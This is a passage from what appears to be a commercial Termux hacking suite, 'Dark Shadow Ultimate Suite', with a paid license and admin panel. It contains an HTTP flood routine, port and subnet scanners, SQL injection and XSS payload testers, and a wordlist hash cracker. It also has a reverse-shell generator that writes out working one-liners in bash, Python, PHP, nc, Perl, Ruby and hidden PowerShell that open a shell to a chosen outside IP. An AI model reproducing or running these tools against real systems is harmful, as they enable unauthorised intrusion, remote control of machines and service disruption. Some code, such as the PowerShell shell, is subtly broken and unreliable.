                        response = session.post(fake_url, data=data, headers=headers, timeout=timeout)
                    else:
                        response = session.get(fake_url, headers=headers, timeout=timeout)
                    
                    request_count += 1
                    
                    # Count errors
                    if response.status_code >= 400:
                        error_count += 1
                    
                    # Randomly close connection to be inefficient
                    if random.random() > 0.9:
                        session.close()
                        session = requests.Session()
                        session.headers.update(headers)
                        
                except (requests.exceptions.Timeout, 
                       requests.exceptions.ConnectionError,
                       requests.exceptions.TooManyRedirects,
                       requests.exceptions.RequestException):
                    error_count += 1
                    request_count += random.randint(1, 3)  # Simulate more requests
                except Exception:
                    pass
        
        # Start threads (limited number)
        thread_list = []
        actual_threads = min(10, threads_count)  # Limit threads for inefficiency
        
        for i in range(actual_threads):
            t = threading.Thread(target=flood)
            t.daemon = True
            thread_list.append(t)
            t.start()
        
        # Monitor with fake progress
        while time.time() - start_time < duration:
            elapsed = time.time() - start_time
            remaining = duration - elapsed
            rps = request_count / elapsed if elapsed > 0 else 0
            error_rate = (error_count / request_count * 100) if request_count > 0 else 0
            
            print(f"\r{Fore.YELLOW}[+] Requests: {request_count:,} | Errors: {error_count:,} ({error_rate:.1f}%) | RPS: {rps:.1f} | Time: {int(elapsed)}s/{duration}s", end="")
            time.sleep(0.5)
        
        print(f"\n{Fore.GREEN}[+] Simulated attack finished.{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[+] Total requests: {request_count:,}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[+] Error rate: {error_rate:.1f}%{Style.RESET_ALL}")
        print(f"{Fore.RED}[!] This attack was DESIGNED TO FAIL on web check hosts{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Real WAF (Web Application Firewall) would block this immediately{Style.RESET_ALL}")
        
        return {
            "total_requests": request_count,
            "error_count": error_count,
            "error_rate": error_rate,
            "duration": duration,
            "status": "FAILED_BY_DESIGN"
        }
    
    # ==================== OTHER TOOLS (Dari kode asli) ====================
    
    def port_scanner_advanced(self, target, start_port=1, end_port=1000, timeout=1):
        """Advanced port scanner dengan service detection"""
        print(f"{Fore.CYAN}[+] Scanning {target}:{start_port}-{end_port}{Style.RESET_ALL}")
        
        common_ports = {
            20: "FTP Data", 21: "FTP Control", 22: "SSH", 23: "Telnet",
            25: "SMTP", 53: "DNS", 80: "HTTP", 110: "POP3", 143: "IMAP",
            443: "HTTPS", 465: "SMTPS", 993: "IMAPS", 995: "POP3S",
            3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL", 5900: "VNC",
            8080: "HTTP-Proxy"
        }
        
        open_ports = []
        
        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                result = sock.connect_ex((target, port))
                sock.close()
                
                if result == 0:
                    service = common_ports.get(port, "Unknown")
                    banner = self.get_banner(target, port)
                    
                    info = {
                        "port": port,
                        "service": service,
                        "banner": banner[:100] if banner else "No banner"
                    }
                    
                    open_ports.append(info)
                    print(f"{Fore.GREEN}[+] {port}/TCP - {service}{Style.RESET_ALL}")
                    if banner:
                        print(f"    Banner: {banner[:80]}...")
                    
            except:
                pass
        
        # Multi-threaded scanning
        threads = []
        for port in range(start_port, end_port + 1):
            thread = threading.Thread(target=scan_port, args=(port,))
            threads.append(thread)
            thread.start()
            
            # Limit concurrent threads
            if len(threads) >= 100:
                for t in threads:
                    t.join()
                threads = []
        
        # Wait for remaining threads
        for t in threads:
            t.join()
        
        print(f"{Fore.CYAN}[+] Scan completed: {len(open_ports)} ports open{Style.RESET_ALL}")
        return open_ports
    
    def get_banner(self, target, port, timeout=2):
        """Get service banner"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((target, port))
            
            # Send something to trigger response
            sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
            
            banner = sock.recv(1024).decode('utf-8', errors='ignore')
            sock.close()
            
            return banner.strip()
        except:
            return None
    
    def network_scanner_comprehensive(self, network_prefix="192.168.1"):
        """Comprehensive network scanner"""
        print(f"{Fore.CYAN}[+] Scanning network {network_prefix}.0/24{Style.RESET_ALL}")
        
        active_hosts = []
        
        def scan_host(ip):
            try:
                # Ping dengan TCP SYN
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((ip, 80))
                sock.close()
                
                if result == 0:
                    # Get hostname
                    try:
                        hostname = socket.gethostbyaddr(ip)[0]
                    except:
                        hostname = "Unknown"
                    
                    # Get MAC address (Linux only)
                    mac = "Unknown"
                    if platform.system() == "Linux":
                        try:
                            with open(f"/sys/class/net/eth0/address", "r") as f:
                                mac = f.read().strip()
                        except:
                            pass
                    
                    host_info = {
                        "ip": ip,
                        "hostname": hostname,
                        "mac": mac,
                        "open_ports": []
                    }
                    
                    # Quick port scan
                    for port in [21, 22, 23, 80, 443, 3389]:
                        try:
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.settimeout(0.2)
                            if s.connect_ex((ip, port)) == 0:
                                host_info["open_ports"].append(port)
                            s.close()
                        except:
                            pass
                    
                    active_hosts.append(host_info)
                    print(f"{Fore.GREEN}[+] Host alive: {ip} ({hostname}){Style.RESET_ALL}")
                    if host_info["open_ports"]:
                        print(f"    Open ports: {host_info['open_ports']}")
                    
            except:
                pass
        
        # Scan all hosts in subnet
        threads = []
        for i in range(1, 255):
            ip = f"{network_prefix}.{i}"
            thread = threading.Thread(target=scan_host, args=(ip,))
            threads.append(thread)
            thread.start()
            
            if len(threads) >= 50:
                for t in threads:
                    t.join()
                threads = []
        
        for t in threads:
            t.join()
        
        print(f"{Fore.CYAN}[+] Scan completed: {len(active_hosts)} hosts found{Style.RESET_ALL}")
        return active_hosts
    
    def sql_injection_tester(self, url, test_parameters=True):
        """Advanced SQL injection tester"""
        print(f"{Fore.CYAN}[+] Testing {url} for SQL injection{Style.RESET_ALL}")
        
        payloads = [
            "'", "\"", "' OR '1'='1", "' OR '1'='1' -- ", "' OR '1'='1' #",
            "' UNION SELECT null-- ", "' UNION SELECT null,null-- ",
            "' AND 1=CONVERT(int, @@version)-- ", "' OR SLEEP(5)-- ",
            "admin' -- ", "' OR 'a'='a", "' OR 1=1-- ", "' OR 1=0-- ",
            "' OR 'x'='x", "' OR '0'='0", "\" OR \"1\"=\"1",
            "\" OR \"1\"=\"1\" -- ", "' OR '1'='1' /*", "'/**/OR/**/'1'='1",
            "'%0AOR%0A'1'='1"
        ]
        
        vulnerabilities = []
        
        # Test URL parameters
        if test_parameters:
            parsed_url = urlparse.urlparse(url)
            query_params = urlparse.parse_qs(parsed_url.query)
            
            for param in query_params:
                original_value = query_params[param][0]
                
                for payload in payloads:
                    try:
                        # Replace parameter value with payload
                        test_params = query_params.copy()
                        test_params[param] = [payload]
                        
                        new_query = urlparse.urlencode(test_params, doseq=True)
                        test_url = urlparse.urlunparse((
                            parsed_url.scheme,
                            parsed_url.netloc,
                            parsed_url.path,
                            parsed_url.params,
                            new_query,
                            parsed_url.fragment
                        ))
                        
                        # Send request
                        req = urlrequest.Request(test_url)
                        req.add_header('User-Agent', 'Mozilla/5.0')
                        
                        start_time = time.time()
                        with urlrequest.urlopen(req, timeout=10) as response:
                            html = response.read().decode('errors', 'ignore')
                            response_time = time.time() - start_time
                        
                        # Check for SQL errors
                        sql_errors = [
                            "SQL syntax", "mysql_fetch", "ORA-", "PostgreSQL",
                            "Microsoft OLE DB", "Unclosed quotation", "syntax error"
                        ]
                        
                        found_error = False
                        for error in sql_errors:
                            if error.lower() in html.lower():
                                found_error = True
                                break
                        
                        # Check for time-based SQLi
                        if response_time > 5:  # If response took more than 5 seconds
                            found_error = True
                        
                        if found_error:
                            vuln = {
                                "type": "SQL Injection",
                                "parameter": param,
                                "payload": payload,
                                "url": test_url,
                                "response_time": response_time
                            }
                            vulnerabilities.append(vuln)
                            
                            print(f"{Fore.RED}[!] VULNERABLE: Parameter '{param}'{Style.RESET_ALL}")
                            print(f"    Payload: {payload}")
                            print(f"    Response time: {response_time:.2f}s")
                            break
                            
                    except Exception as e:
                        pass
        
        if vulnerabilities:
            print(f"{Fore.RED}[!] Found {len(vulnerabilities)} SQL injection vulnerabilities{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[+] No SQL injection vulnerabilities found{Style.RESET_ALL}")
        
        return vulnerabilities
    
    def xss_scanner(self, url):
        """XSS vulnerability scanner"""
        print(f"{Fore.CYAN}[+] Testing {url} for XSS{Style.RESET_ALL}")
        
        payloads = [
            "<script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>"
        ]
        
        vulnerabilities = []
        
        try:
            # Get original page
            req = urlrequest.Request(url)
            req.add_header('User-Agent', 'Mozilla/5.0')
            
            with urlrequest.urlopen(req, timeout=10) as response:
                original_html = response.read().decode('errors', 'ignore')
            
            # Test each payload
            for payload in payloads:
                # Test in URL parameters
                test_url = f"{url}?test={urlparse.quote(payload)}"
                
                req = urlrequest.Request(test_url)
                req.add_header('User-Agent', 'Mozilla/5.0')
                
                with urlrequest.urlopen(req, timeout=10) as response:
                    test_html = response.read().decode('errors', 'ignore')
                
                # Check if payload appears unencoded in response
                if payload in test_html and payload not in original_html:
                    vuln = {
                        "type": "XSS",
                        "payload": payload,
                        "url": test_url,
                        "method": "URL Parameter"
                    }
                    vulnerabilities.append(vuln)
                    
                    print(f"{Fore.RED}[!] XSS found with payload: {payload[:50]}...{Style.RESET_ALL}")
                    break
                    
        except Exception as e:
            print(f"{Fore.YELLOW}[-] Error: {e}{Style.RESET_ALL}")
        
        return vulnerabilities
    
    def hash_cracker_advanced(self, hash_value, hash_type="auto", wordlist=None):
        """Advanced hash cracker dengan multiple algorithms"""
        print(f"{Fore.CYAN}[+] Cracking hash: {hash_value}{Style.RESET_ALL}")
        
        if hash_type == "auto":
            hash_type = self.detect_hash_type(hash_value)
            print(f"{Fore.CYAN}[+] Detected hash type: {hash_type}{Style.RESET_ALL}")
        
        # Default wordlist jika tidak disediakan
        if not wordlist:
            wordlist = [
                "password", "123456", "12345678", "1234", "qwerty", "12345",
                "dragon", "baseball", "football", "monkey", "letmein",
                "admin", "welcome", "password1", "123123", "sunshine",
                "master", "hello", "freedom", "whatever", "qazwsx",
                "trustno1", "dragon", "mustang", "access", "shadow"
            ]
        
        # Add brute force patterns
        patterns = []
        for word in wordlist:
            patterns.append(word)  # Original
            patterns.append(word.upper())  # Uppercase
            patterns.append(word.capitalize())  # Capitalized
            patterns.append(word + "123")  # Word + 123
            patterns.append(word + "!")  # Word + !
            patterns.append("123" + word)  # 123 + word
        
        found = False
        
        for attempt in patterns:
            test_hash = self.hash_string(attempt, hash_type)
            
            if test_hash == hash_value:
                print(f"{Fore.GREEN}[+] CRACKED: {attempt}{Style.RESET_ALL}")
                print(f"{Fore.GREEN}[+] Hash: {hash_value}{Style.RESET_ALL}")
                print(f"{Fore.GREEN}[+] Type: {hash_type}{Style.RESET_ALL}")
                found = True
                return attempt
        
        if not found:
            print(f"{Fore.RED}[-] Not found in wordlist{Style.RESET_ALL}")
            return None
    
    def detect_hash_type(self, hash_value):
        """Detect hash type berdasarkan length dan pattern"""
        hash_length = len(hash_value)
        
        hash_types = {
            32: "md5",      # 32 chars
            40: "sha1",     # 40 chars
            64: "sha256",   # 64 chars
            56: "sha224",   # 56 chars
            96: "sha384",   # 96 chars
            128: "sha512",  # 128 chars
        }
        
        return hash_types.get(hash_length, "unknown")
    
    def hash_string(self, string, hash_type):
        """Hash a string dengan algoritma tertentu"""
        hash_funcs = {
            "md5": hashlib.md5,
            "sha1": hashlib.sha1,
            "sha256": hashlib.sha256,
            "sha224": hashlib.sha224,
            "sha384": hashlib.sha384,
            "sha512": hashlib.sha512
        }
        
        if hash_type in hash_funcs:
            return hash_funcs[hash_type](string.encode()).hexdigest()
        
        return ""
    
    def password_generator(self, length=12, count=10, include_special=True):
        """Generate strong passwords"""
        print(f"{Fore.CYAN}[+] Generating {count} passwords (length: {length}){Style.RESET_ALL}")
        
        passwords = []
        
        lowercase = string.ascii_lowercase
        uppercase = string.ascii_uppercase
        digits = string.digits
        special = "!@#$%^&*()_+-=[]{}|;:,.<>?"
        
        for i in range(count):
            # Build character pool
            pool = lowercase + uppercase + digits
            if include_special:
                pool += special
            
            # Ensure at least one of each type
            password_chars = [
                random.choice(lowercase),
                random.choice(uppercase),
                random.choice(digits)
            ]
            
            if include_special:
                password_chars.append(random.choice(special))
            
            # Fill remaining length
            remaining = length - len(password_chars)
            password_chars.extend(random.choice(pool) for _ in range(remaining))
            
            # Shuffle
            random.shuffle(password_chars)
            password = ''.join(password_chars)
            passwords.append(password)
            
            print(f"{Fore.GREEN}[{i+1}] {password}{Style.RESET_ALL}")
        
        return passwords
    
    def reverse_shell_generator(self, ip="127.0.0.1", port=4444, language="python"):
        """Generate reverse shells in multiple languages"""
        print(f"{Fore.CYAN}[+] Generating {language} reverse shell{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[+] Connect to: {ip}:{port}{Style.RESET_ALL}")
        
        shells = {
            "python": f'''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' ''',
            
            "bash": f'''bash -i >& /dev/tcp/{ip}/{port} 0>&1''',
            
            "php": f'''php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");' ''',
            
            "nc": f'''rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f''',
            
            "perl": f'''perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};' ''',
            
            "ruby": f'''ruby -rsocket -e'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' ''',
            
            "powershell": f'''powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'''
        }
        
        if language.lower() in shells:
            shell_code = shells[language.lower()]
            print(f"\n{Fore.GREEN}{shell_code}{Style.RESET_ALL}")
            
            # Save to file
            filename = f"reverse_shell_{language}.txt"
            with open(filename, 'w') as f:
                f.write(shell_code)
            print(f"{Fore.CYAN}[+] Saved to {filename}{Style.RESET_ALL}")
            
            return shell_code
        else:
            print(f"{Fore.RED}[-] Language not supported: {language}{Style.RESET_ALL}")
            return None
    
    def crypto_analyzer(self, text):
        """Analyze text for crypto patterns"""
        print(f"{Fore.CYAN}[+] Analyzing text for crypto patterns{Style.RESET_ALL}")
        
        results = {
            "base64": [],
            "hex": [],
            "rot13": [],
            "caesar": [],
            "binary": []
        }
        
        # Check for Base64
        try:
            if len(text) % 4 == 0:
                decoded = base64.b64decode(text).decode('utf-8', errors='ignore')
                if decoded and len(decoded) > 3:
                    results["base64"].append(decoded)
        except:
            pass
        
        # Check for Hex
        hex_pattern = r'^[0-9a-fA-F]+$'
        if re.match(hex_pattern, text):
            try:
                decoded = bytes.fromhex(text).decode('utf-8', errors='ignore')
                if decoded:
                    results["hex"].append(decoded)
            except:
                pass
        
        # ROT13
        rot13_result = self.rot13_decode(text)
        if rot13_result != text:
            results["rot13"].append(rot13_result)
        
        # Caesar cipher (ROT1-25)
        for shift in range(1, 26):
            caesar_result = self.caesar_cipher(text, shift)
            # Check if result looks like English
            if self.looks_like_english(caesar_result):
                results["caesar"].append(f"ROT{shift}: {caesar_result}")
        
        # Binary
        binary_pattern = r'^[01\s]+$'
        if re.match(binary_pattern, text.replace(' ', '')):
            try:
                # Remove spaces and convert 8-bit chunks
                binary = text.replace(' ', '')
                decoded = ''.join(chr(int(binary[i:i+8], 2)) for i in range(0, len(binary), 8))
                if decoded:
                    results["binary"].append(decoded)
            except:
                pass
        
        # Display results
        for cipher_type, decodings in results.items():
            if decodings:
                print(f"\n{Fore.GREEN}[{cipher_type.upper()}]{Style.RESET_ALL}")
                for i, decode in enumerate(decodings[:3]):  # Show first 3
                    print(f"  {i+1}. {decode[:100]}{'...' if len(decode) > 100 else ''}")
        
        return results
    
    def rot13_decode(self, text):
        """ROT13 decode"""
        result = []
        for char in text:
            if 'a' <= char <= 'z':
                result.append(chr((ord(char) - ord('a') + 13) % 26 + ord('a')))
            elif 'A' <= char <= 'Z':
                result.append(chr((ord(char) - ord('A') + 13) % 26 + ord('A')))
            else:
                result.append(char)
        return ''.join(result)
    
    def caesar_cipher(self, text, shift):
        """Caesar cipher decoder"""
        result = []
        for char in text:
            if 'a' <= char <= 'z':
                result.append(chr((ord(char) - ord('a') + shift) % 26 + ord('a')))
            elif 'A' <= char <= 'Z':
                result.append(chr((ord(char) - ord('A') + shift) % 26 + ord('A')))
            else:
                result.append(char)
        return ''.join(result)
    
    def looks_like_english(self, text, threshold=0.3):
        """Check if text looks like English"""
        if not text:
            return False
        
        # Common English words
        common_words = ["the", "and", "have", "that", "for", "you", "with", "this", "from"]
        
        text_lower = text.lower()
        words = re.findall(r'\b[a-z]{3,}\b', text_lower)
        
        if not words:
            return False
        
        # Count common words
        common_count = sum(1 for word in words if word in common_words)
        ratio = common_count / len(words)
        
        return ratio > threshold
    
    def stegano_analyzer(self, image_path=None, text=None):
        """Basic steganography analyzer"""
        print(f"{Fore.CYAN}[+] Steganography analyzer{Style.RESET_ALL}")
        
        if image_path and os.path.exists(image_path):
            print(f"{Fore.YELLOW}[!] Image analysis would require PIL/Pillow library{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] Install: pip install Pillow{Style.RESET_ALL}")
        
        if text:
            # Check for LSB steganography patterns
            print(f"{Fore.CYAN}[+] Analyzing text for hidden data{Style.RESET_ALL}")
            
            # Check for null bytes or unusual characters
            unusual_chars = [c for c in text if ord(c) < 32 and c not in '\n\r\t']
            if unusual_chars:
                print(f"{Fore.GREEN}[+] Found unusual characters (possible hidden data){Style.RESET_ALL}")
            
            # Check for patterns that might indicate stego
            binary_pattern = r'[01]{8,}'  # At least 8 binary digits
            hex_pattern = r'[0-9a-fA-F]{8,}'  # At least 8 hex digits
            
            if re.search(binary_pattern, text):
                print(f"{Fore.GREEN}[+] Found binary pattern (possible encoded data){Style.RESET_ALL}")
            
            if re.search(hex_pattern, text):
                print(f"{Fore.GREEN}[+] Found hex pattern (possible encoded data){Style.RESET_ALL}")
        
        return {"status": "analysis_complete"}
    
    def file_analyzer(self, filepath):
        """Basic file analyzer for suspicious content"""
        if not os.path.exists(filepath):
            print(f"{Fore.RED}[-] File not found: {filepath}{Style.RESET_ALL}")
            return None
        
        print(f"{Fore.CYAN}[+] Analyzing file: {filepath}{Style.RESET_ALL}")
        
        results = {
            "filename": os.path.basename(filepath),
            "size": os.path.getsize(filepath),
            "md5": "",
            "sha1": "",
            "suspicious": False,
            "findings": []
        }
        
        # Calculate hashes
        try:
            with open(filepath, 'rb') as f:
                content = f.read()
                results["md5"] = hashlib.md5(content).hexdigest()
                results["sha1"] = hashlib.sha1(content).hexdigest()
        except:
            pass
        
        # Check file extension vs content
        ext = os.path.splitext(filepath)[1].lower()
        
        # Check for suspicious extensions
        suspicious_exts = ['.exe', '.bat', '.vbs', '.ps1', '.js', '.jar']
        if ext in suspicious_exts:
            results["findings"].append(f"Suspicious extension: {ext}")
            results["suspicious"] = True
        
        # Check for double extensions
        if len(os.path.basename(filepath).split('.')) > 2:
            results["findings"].append("Double extension detected")
            results["suspicious"] = True
        
        # Check file size (too small or too large)
        if results["size"] < 100:  # Less than 100 bytes
            results["findings"].append("Very small file size")
            results["suspicious"] = True
        
        # Check for executable markers (PE header for Windows)
        if ext == '.exe':
            try:
                with open(filepath, 'rb') as f:
                    header = f.read(2)
                    if header == b'MZ':  # DOS header
                        results["findings"].append("Windows PE executable detected")
            except:
                pass
        
        # Display results
        print(f"{Fore.CYAN}[+] File: {results['filename']}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[+] Size: {results['size']} bytes{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[+] MD5: {results['md5']}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[+] SHA1: {results['sha1']}{Style.RESET_ALL}")
        
        if results["findings"]:
            print(f"{Fore.YELLOW}[!] Findings:{Style.RESET_ALL}")
            for finding in results["findings"]:
                print(f"  - {finding}")
        
        if results["suspicious"]:
            print(f"{Fore.RED}[!] File appears suspicious!{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[+] File appears normal{Style.RESET_ALL}")
        
        return results
    
    def wifi_analyzer(self):
        """Basic WiFi analyzer (platform dependent)"""
        print(f"{Fore.CYAN}[+] WiFi analyzer{Style.RESET_ALL}")
        
        system = platform.system()
        
        if system == "Windows":
            print(f"{Fore.YELLOW}[!] On Windows, run: netsh wlan show networks{Style.RESET_ALL}")
            try:
                result = subprocess.run(["netsh", "wlan", "show", "networks"], 
                                       capture_output=True, text=True)
                print(result.stdout)
            except:
                print(f"{Fore.RED}[-] Failed to run WiFi scan{Style.RESET_ALL}")
        
        elif system == "Linux":
            print(f"{Fore.YELLOW}[!] On Linux, run: sudo iwlist scan{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] Or: nmcli device wifi list{Style.RESET_ALL}")
        
        elif system == "Darwin":  # macOS
            print(f"{Fore.YELLOW}[!] On macOS, run: /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s{Style.RESET_ALL}")
        
        else:
            print(f"{Fore.RED}[-] Unsupported platform: {system}{Style.RESET_ALL}")
    
    def system_info(self):
        """Display detailed system information"""
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}SYSTEM INFORMATION{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        
        info = {
            "Platform": platform.platform(),
            "System": platform.system(),
            "Node": platform.node(),
            "Release": platform.release(),
            "Version": platform.version(),
            "Machine": platform.machine(),
            "Processor": platform.processor(),
            "Python": platform.python_version(),
            "User": getpass.getuser(),
            "Current Directory": os.getcwd(),
            "CPU Cores": os.cpu_count() or "Unknown"
        }
        
        for key, value in info.items():
            print(f"{Fore.GREEN}{key:20}{Style.RESET_ALL}: {value}")
        
        # Network interfaces
        try:
            hostname = socket.gethostname()
            ip_address = socket.gethostbyname(hostname)
            print(f"{Fore.GREEN}Host IP Address{Style.RESET_ALL}: {ip_address}")
        except:
            pass
    
    def banner_grabbing(self, target, port=80):
        """Advanced banner grabbing"""
        print(f"{Fore.CYAN}[+] Grabbing banner from {target}:{port}{Style.RESET_ALL}")
        
        banners = []
        
        # Try different methods
        methods = [
            ("HTTP", b"HEAD / HTTP/1.0\r\n\r\n"),
            ("SSH", b"\r\n"),
            ("FTP", b"\r\n"),
            ("SMTP", b"EHLO example.com\r\n"),
            ("Generic", b"\r\n")
        ]
        
        for service_name, payload in methods:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((target, port))
                
                sock.send(payload)
                banner = sock.recv(1024).decode('utf-8', errors='ignore')
                sock.close()
                
                if banner.strip():
                    banners.append({
                        "service": service_name,
                        "banner": banner.strip()
                    })
                    
                    print(f"{Fore.GREEN}[{service_name}] {banner[:100]}...{Style.RESET_ALL}")
                    
            except:
                continue
        
        return banners

# ==================== ADMIN CONTROL PANEL ====================
def admin_panel(username):
    """Admin control panel for license management"""
    clear_screen()
    typing_effect(ADMIN_ASCII)
    print(Fore.MAGENTA + "=" * 70)
    print(Fore.YELLOW + " " * 25 + "ADMIN CONTROL PANEL")
    print(Fore.MAGENTA + "=" * 70)
    
    license_sys = AdvancedLicenseSystem()
    users = load_users()
    
    # Check if user is admin
    if username not in users:
        print(Fore.RED + "[✗] User not found!")
        return
    
    user_data = users[username]
    termux_id = user_data.get("termux_id", "")
    
    if not license_sys.is_admin(termux_id):
        print(Fore.RED + "[✗] ACCESS DENIED! Admin privileges required.")
        print(Fore.YELLOW + "[!] Contact @MR_PRIM0 to purchase admin access")
        time.sleep(3)
        return
    
    print(Fore.GREEN + f"\n[✓] Welcome Admin: {username}")
    print(Fore.CYAN + f"[+] Termux ID: {termux_id}")
    print(Fore.CYAN + f"[+] Admin ID: {termux_id}")
    print(Fore.MAGENTA + "-" * 70)
    
    while True:
        print(Fore.YELLOW + "\n[1] Generate License Keys")
        print(Fore.YELLOW + "[2] Set License Duration (Days/Hours)")
        print(Fore.YELLOW + "[3] View All Users")
        print(Fore.YELLOW + "[4] Add/Remove Admin")
        print(Fore.YELLOW + "[5] Check License Status")
        print(Fore.YELLOW + "[6] View Admin IDs")
        print(Fore.YELLOW + "[7] Back to Main Menu")
        print(Fore.MAGENTA + "-" * 70)
        
        choice = input(Fore.CYAN + "\n[?] Select option (1-7): " + Fore.WHITE).strip()
        
        if choice == "1":
            admin_generate_license(license_sys)
        elif choice == "2":
            admin_set_license_duration(license_sys)
        elif choice == "3":
            admin_view_users(users)
        elif choice == "4":
            admin_manage_admins(license_sys, termux_id)
        elif choice == "5":
            admin_check_license(license_sys)
        elif choice == "6":
            admin_view_admin_ids(license_sys)
        elif choice == "7":
            return
        else:
            print(Fore.RED + "[✗] Invalid choice!")

def admin_generate_license(license_sys):
    """Generate license keys with custom duration"""
    print(Fore.CYAN + "\n" + "="*70)
    print(Fore.YELLOW + "GENERATE LICENSE KEYS")
    print(Fore.CYAN + "="*70)
    
    print(Fore.YELLOW + "\n[+] Select License Tier:")
    print(Fore.GREEN + "[1] FREE (7 days trial)")
    print(Fore.YELLOW + "[2] PRO (1 year)")
    print(Fore.MAGENTA + "[3] ULTIMATE (Lifetime)")
    print(Fore.CYAN + "[4] CUSTOM Tier")
    print(Fore.MAGENTA + "-" * 70)
    
    tier_choice = input(Fore.CYAN + "[?] Select tier (1-4): " + Fore.WHITE).strip()
    
    if tier_choice == "1":
        tier = "FREE"
        default_days = 7
    elif tier_choice == "2":
        tier = "PRO"
        default_days = 365
    elif tier_choice == "3":
        tier = "ULTIMATE"
        default_days = 9999  # Lifetime
    elif tier_choice == "4":
        tier = input("Enter custom tier name: ").upper()
        default_days = 30
    else:
        tier = "PRO"
        default_days = 365
    
    print(Fore.CYAN + "\n[+] Set License Duration:")
    print(Fore.YELLOW + "[1] Days (default: {})".format(default_days))
    print(Fore.YELLOW + "[2] Hours")
    print(Fore.YELLOW + "[3] Minutes (for testing)")
    print(Fore.MAGENTA + "-" * 70)
    
    duration_choice = input(Fore.CYAN + "[?] Select duration unit (1-3): " + Fore.WHITE).strip()
    
    if duration_choice == "1":
        unit = "days"
        duration = int(input(f"Enter number of days (default {default_days}): ") or str(default_days))
    elif duration_choice == "2":
        unit = "hours"
        hours = int(input("Enter number of hours: ") or "24")
        duration = hours / 24  # Convert to days for storage
    elif duration_choice == "3":
        unit = "minutes"
        minutes = int(input("Enter number of minutes: ") or "60")
        duration = minutes / 1440  # Convert to days
    else:
        unit = "days"
        duration = default_days
    
    # Calculate expiry date
    expiry_date = datetime.datetime.now() + datetime.timedelta(days=duration)
    
    print(Fore.CYAN + "\n[+] Additional Options:")
    print(Fore.YELLOW + "[1] Generate single key")
    print(Fore.YELLOW + "[2] Generate multiple keys")
    print(Fore.MAGENTA + "-" * 70)
    
    count_choice = input(Fore.CYAN + "[?] Select option (1-2): " + Fore.WHITE).strip()
    
    if count_choice == "2":
        count = int(input("How many keys to generate? (1-100): ") or "1")
        count = max(1, min(100, count))
    else:
        count = 1
    
    keys = []
    for i in range(count):
        # Generate custom key
        custom_seed = f"{tier}_{duration}_{int(time.time())}_{uuid.uuid4().hex[:8]}_ADMIN_GEN"
        license_key, encrypted = license_sys.generate_license(tier, duration, custom_seed)
        keys.append((license_key, encrypted))
        
        print(Fore.GREEN + f"\n[✓] Key {i+1}/{count} Generated:")
        print(Fore.CYAN + f"    Tier: {tier}")
        print(Fore.CYAN + f"    Duration: {duration} {unit}")
        print(Fore.CYAN + f"    Expires: {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}")
        print(Fore.YELLOW + f"    License Key: {license_key}")
    
    # Save keys to file
    if keys:
        filename = f"license_keys_{int(time.time())}.txt"
        with open(filename, 'w') as f:
            f.write(f"Dark Shadow Ultimate Suite - License Keys\n")
            f.write(f"Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Admin: {platform.node()}\n")
            f.write("="*50 + "\n\n")
            
            for i, (key, encrypted) in enumerate(keys, 1):
                f.write(f"Key #{i}:\n")
                f.write(f"Tier: {tier}\n")
                f.write(f"Duration: {duration} {unit}\n")
                f.write(f"Expires: {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"License: {key}\n")
                f.write(f"Encrypted: {encrypted}\n")
                f.write("-"*40 + "\n")
        
